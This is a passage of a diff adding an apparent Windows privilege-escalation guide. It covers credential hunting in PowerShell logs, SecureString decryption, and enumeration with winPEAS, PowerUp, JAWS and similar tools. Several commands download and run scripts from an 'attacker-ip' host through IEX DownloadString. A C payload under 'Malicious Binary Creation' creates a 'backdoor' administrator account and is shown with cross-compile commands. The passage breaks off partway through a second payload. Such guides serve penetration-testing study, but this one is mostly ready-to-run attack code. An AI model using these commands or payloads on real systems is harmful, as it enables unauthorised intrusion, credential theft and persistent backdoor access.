+</span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\*transcript*.txt"</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="s2">"ConvertTo-SecureString|PSCredential|Get-Credential"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Search for password patterns</span><span class="w">
+</span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\*transcript*.txt"</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="s2">"password|pwd|pass"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="script-block-logging">Script Block Logging</h3>
+
+<p><strong>Event Log Analysis:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PowerShell Script Block Logging events</span><span class="w">
+</span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="s2">"Microsoft-Windows-PowerShell/Operational"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Id</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4104</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Decode Script Block content</span><span class="w">
+</span><span class="nv">$events</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="s2">"Microsoft-Windows-PowerShell/Operational"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Id</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4104</span><span class="p">}</span><span class="w">
+</span><span class="nv">$events</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Message</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Search for specific patterns</span><span class="w">
+</span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="s2">"Microsoft-Windows-PowerShell/Operational"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Id</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4104</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Message</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*password*"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>PowerShell Module Logging:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Module logging events</span><span class="w">
+</span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="s2">"Microsoft-Windows-PowerShell/Operational"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Id</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4103</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Command execution events</span><span class="w">
+</span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="s2">"Microsoft-Windows-PowerShell/Operational"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Id</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4105</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Id</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4106</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="credential-extraction-from-powershell">Credential Extraction from PowerShell</h3>
+
+<p><strong>SecureString Decryption:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># If you find SecureString creation in logs</span><span class="w">
+</span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"found_encrypted_string"</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="nv">$key</span><span class="w">
+</span><span class="nv">$bstr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">SecureStringToBSTR</span><span class="p">(</span><span class="nv">$securePassword</span><span class="p">)</span><span class="w">
+</span><span class="nv">$plainPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">PtrToStringAuto</span><span class="p">(</span><span class="nv">$bstr</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="15-automated-enumeration">1.5 Automated Enumeration</h2>
+
+<p>Automated tools accelerate the enumeration process but should complement manual techniques.</p>
+
+<h3 id="winpeas">WinPEAS</h3>
+
+<p><strong>Installation and Execution:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Download winPEAS</span><span class="w">
+</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://attacker-ip/winPEASx64.exe</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">winPEAS.exe</span><span class="w">
+
+</span><span class="c"># Execute with different verbosity levels</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w">
+</span><span class="o">.</span><span class="nx">\winPEAS.exe</span><span class="w"> </span><span class="nx">quiet</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">systeminfo</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">userinfo</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">processinfo</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">servicesinfo</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">filesinfo</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Targeted Scans:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check specific privilege escalation vectors</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">fast</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">searchfast</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="alternative-tools">Alternative Tools</h3>
+
+<p><strong>PowerUp (PowerSploit):</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Download and import</span><span class="w">
+</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://attacker-ip/PowerUp.ps1'</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Run all checks</span><span class="w">
+</span><span class="n">Invoke-AllChecks</span><span class="w">
+
+</span><span class="c"># Specific checks</span><span class="w">
+</span><span class="n">Get-UnquotedService</span><span class="w">
+</span><span class="nx">Get-ModifiableServiceFile</span><span class="w">
+</span><span class="n">Get-ModifiableService</span><span class="w">
+</span><span class="nx">Get-ServiceUnquoted</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Seatbelt:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Download and execute</span><span class="w">
+</span><span class="o">.</span><span class="n">\Seatbelt.exe</span><span class="w"> </span><span class="nx">all</span><span class="w">
+</span><span class="o">.</span><span class="n">\Seatbelt.exe</span><span class="w"> </span><span class="nt">-group</span><span class="o">=</span><span class="n">system</span><span class="w">
+</span><span class="o">.</span><span class="nx">\Seatbelt.exe</span><span class="w"> </span><span class="nt">-group</span><span class="o">=</span><span class="n">user</span><span class="w">
+</span><span class="o">.</span><span class="nx">\Seatbelt.exe</span><span class="w"> </span><span class="nt">-group</span><span class="o">=</span><span class="n">remote</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>SharpUp:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># .NET implementation of PowerUp</span><span class="w">
+</span><span class="o">.</span><span class="n">\SharpUp.exe</span><span class="w"> </span><span class="nx">audit</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="jaws-just-another-windows-enum-script">JAWS (Just Another Windows Enum Script)</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PowerShell-based enumeration</span><span class="w">
+</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://attacker-ip/jaws-enum.ps1'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="custom-enumeration-scripts">Custom Enumeration Scripts</h3>
+
+<p><strong>Combined Information Gathering:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Custom enumeration function</span><span class="w">
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">Invoke-WinEnum</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Starting Windows Enumeration"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
+    
+    </span><span class="c"># System Information</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] System Information"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="n">systeminfo</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Name"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Version"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"System Type"</span><span class="w">
+    
+    </span><span class="c"># Current User Context</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Current User Context"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+    
+    </span><span class="c"># Local Users and Groups</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Local Users"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="n">Get-LocalUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="p">,</span><span class="w"> </span><span class="nx">LastLogon</span><span class="w">
+    
+    </span><span class="c"># Network Information</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Network Configuration"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+    </span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w">
+    </span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">LISTENING</span><span class="w">
+    
+    </span><span class="c"># Running Processes</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Running Processes"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Id</span><span class="p">,</span><span class="w"> </span><span class="nx">Path</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+    
+    </span><span class="c"># Services</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Running Services"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="n">Get-Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Status</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Running"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">DisplayName</span><span class="w">
+    
+    </span><span class="c"># Scheduled Tasks</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Scheduled Tasks"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">State</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Ready"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">TaskName</span><span class="p">,</span><span class="w"> </span><span class="nx">Author</span><span class="w">
+    
+    </span><span class="c"># PowerShell History</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] PowerShell History"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="p">(</span><span class="n">Get-PSReadlineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Get-Content</span><span class="w"> </span><span class="p">(</span><span class="n">Get-PSReadlineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-Last</span><span class="w"> </span><span class="nx">20</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Execute enumeration</span><span class="w">
+</span><span class="n">Invoke-WinEnum</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="tool-comparison-and-limitations">Tool Comparison and Limitations</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Tool</th>
+      <th>Strengths</th>
+      <th>Limitations</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>winPEAS</strong></td>
+      <td>Comprehensive, color-coded output</td>
+      <td>Can miss custom configurations</td>
+    </tr>
+    <tr>
+      <td><strong>PowerUp</strong></td>
+      <td>Service-focused, modular</td>
+      <td>Requires PowerShell execution policy bypass</td>
+    </tr>
+    <tr>
+      <td><strong>Seatbelt</strong></td>
+      <td>.NET based, detailed output</td>
+      <td>Large output requires filtering</td>
+    </tr>
+    <tr>
+      <td><strong>Manual</strong></td>
+      <td>Complete control, thorough</td>
+      <td>Time-intensive</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Best Practice Approach:</strong></p>
+<ol>
+  <li>Start with automated tools for quick wins</li>
+  <li>Follow up with targeted manual enumeration</li>
+  <li>Always verify automated tool findings</li>
+  <li>Combine multiple tools for comprehensive coverage</li>
+</ol>
+
+<h1 id="2-leveraging-windows-services">2. Leveraging Windows Services</h1>
+
+<p>Windows Services are long-running background executables managed by the Service Control Manager, similar to daemons on Unix systems. Services run under specific user accounts (LocalSystem, Network Service, Local Service, domain users, or local users) and represent prime targets for privilege escalation.</p>
+
+<h2 id="21-service-binary-hijacking">2.1 Service Binary Hijacking</h2>
+
+<p>Service binary hijacking exploits weak file permissions on service executables to replace them with malicious binaries that execute with elevated privileges.</p>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p><strong>List all services with binary paths:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get services with paths (requires interactive logon)</span><span class="w">
+</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">State</span><span class="p">,</span><span class="nx">PathName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">State</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'Running'</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Alternative methods</span><span class="w">
+</span><span class="n">Get-Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Status</span><span class="p">,</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"Path"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{(</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"Name='</span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">'"</span><span class="p">)</span><span class="o">.</span><span class="nf">PathName</span><span class="p">}}</span><span class="w">
+</span><span class="nx">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">state</span><span class="w">
+</span><span class="nx">sc</span><span class="w"> </span><span class="nx">query</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Filter for non-Windows services:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Services outside System32</span><span class="w">
+</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s2">"C:\Windows\System32*"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="bp">$null</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="p">,</span><span class="w"> </span><span class="nx">State</span><span class="p">,</span><span class="w"> </span><span class="nx">StartMode</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="permission-analysis">Permission Analysis</h3>
+
+<p><strong>Check file permissions:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using icacls</span><span class="w">
+</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\path\to\service.exe"</span><span class="w">
+
+</span><span class="c"># Using PowerShell ACL</span><span class="w">
+</span><span class="n">Get-Acl</span><span class="w"> </span><span class="s2">"C:\path\to\service.exe"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w">
+
+</span><span class="c"># Check directory permissions</span><span class="w">
+</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\Application\"</span><span class="w">
+
+</span><span class="c"># Automated permission check</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"C:\Program Files\"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$acl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$acl</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FileSystemRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"FullControl|Modify|Write"</span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Writable: </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="si">)</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="icacls-permission-masks">icacls Permission Masks</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Mask</th>
+      <th>Permissions</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>F</strong></td>
+      <td>Full access</td>
+    </tr>
+    <tr>
+      <td><strong>M</strong></td>
+      <td>Modify access</td>
+    </tr>
+    <tr>
+      <td><strong>RX</strong></td>
+      <td>Read and execute</td>
+    </tr>
+    <tr>
+      <td><strong>R</strong></td>
+      <td>Read-only</td>
+    </tr>
+    <tr>
+      <td><strong>W</strong></td>
+      <td>Write-only</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="service-control">Service Control</h3>
+
+<p><strong>Check service startup type:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">StartMode</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'servicename'</span><span class="p">}</span><span class="w">
+</span><span class="n">Get-Service</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">StartType</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Service control commands:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Start/Stop services</span><span class="w">
+</span><span class="n">Start-Service</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+</span><span class="n">Stop-Service</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+</span><span class="n">Restart-Service</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+
+</span><span class="c"># Command line alternatives</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+</span><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+</span><span class="n">sc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Check restart permissions:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check shutdown privilege (see section 1.2 for whoami commands)</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"SeShutdownPrivilege"</span><span class="w">
+
+</span><span class="c"># Test service control</span><span class="w">
+</span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">Stop-Service</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="nt">-WhatIf</span><span class="w">
+    </span><span class="s2">"Can control service"</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="s2">"Cannot control service: </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Exception</span><span class="o">.</span><span class="nf">Message</span><span class="si">)</span><span class="s2">"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="malicious-binary-creation">Malicious Binary Creation</h3>
+
+<p><strong>Standard privilege escalation payloads (used throughout this guide):</strong></p>
+
+<p><em>Simple C payload:</em></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="s">"net user backdoor Password123! /add"</span><span class="p">);</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="s">"net localgroup administrators backdoor /add"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><em>Cross-compilation:</em></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># On Kali Linux</span>
+x86_64-w64-mingw32-gcc adduser.c <span class="nt">-o</span> adduser.exe  <span class="c"># 64-bit</span>
+i686-w64-mingw32-gcc adduser.c <span class="nt">-o</span> adduser32.exe  <span class="c"># 32-bit</span>
+</code></pre></div></div>
+
+<p><em>Advanced payload with error handling:</em></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)};</span>
+    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
+    
+    <span class="c1">// Create user and add to administrators</span>
